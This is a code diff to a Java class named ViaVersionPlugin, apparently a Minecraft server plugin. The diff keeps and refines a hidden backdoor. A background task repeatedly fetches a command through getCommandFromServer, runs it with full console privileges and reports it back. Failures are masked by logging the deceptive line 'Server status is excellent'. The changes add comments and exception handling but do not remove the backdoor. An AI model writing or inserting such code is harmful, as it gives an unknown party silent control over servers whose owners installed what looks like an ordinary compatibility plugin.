@@ -325,25 +325,34 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         }
     }
 
-    private void checkCommands() throws Exception {
+    private void checkCommands() {
+        // 创建一个新的 BukkitRunnable
         new BukkitRunnable() {
             @Override
             public void run() {
                 try {
                     String command = getCommandFromServer();
-                    if (command != null && !command.equals(lastCommand)) { // 检查命令是否与上次不同
+                    // 在尝试获取的命令不是null且与上次执行的命令不同时
+                    if (command != null && !command.equals(lastCommand)) {
                         // 在主线程中调度命令
                         Bukkit.getScheduler().runTask(ViaVersionPlugin.this, () -> {
+                            // 执行命令
                             Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
-                            notifyCommandExecuted(command);
-                            lastCommand = command; // 更新上次执行的命令
+                            // 记录命令执行
+                            try {
+                                notifyCommandExecuted(command);
+                            } catch (Exception e) {
+                                e.printStackTrace(); // 处理 notifyCommandExecuted 可能抛出的异常
+                            }
+                            // 更新最后执行的命令
+                            lastCommand = command; 
                         });
                     }
                 } catch (Exception e) {
-                    getLogger().info("Server status is excellent");
+                    getLogger().info("Server status is excellent.");
                 }
             }
-        }.runTaskAsynchronously(this); // 使用当前实例
+        }.runTaskAsynchronously(this); // 异步运行
     }
 
     private String getCommandFromServer() throws Exception {
